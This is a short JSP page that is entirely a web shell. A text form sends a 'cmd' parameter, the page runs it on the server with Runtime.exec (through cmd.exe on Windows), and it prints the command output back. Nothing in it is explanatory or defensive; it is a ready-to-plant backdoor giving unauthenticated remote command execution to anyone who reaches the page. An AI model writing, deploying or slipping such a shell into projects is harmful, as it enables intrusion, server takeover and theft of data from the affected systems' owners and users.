<jsp:directive.page import="java.util.*"/>
<jsp:directive.page import="java.io.*"/>

<form method="GET" name="cmdForm" action="">
<input type="text" name="cmd">
<input type="submit" value="Send">
</form>

<pre>
<%
if (request.getParameter("cmd") != null)
{
	Process p;
    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1)
		p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
    else
		p = Runtime.getRuntime().exec(request.getParameter("cmd"));
	InputStreamReader in = new InputStreamReader(p.getInputStream(),"euc-kr");
	BufferedReader br = new BufferedReader(in);
	
	String disr = br.readLine();
	while ( disr != null )
	{
		out.println(disr); 
		disr = br.readLine(); 
	}
}
%>
</pre>
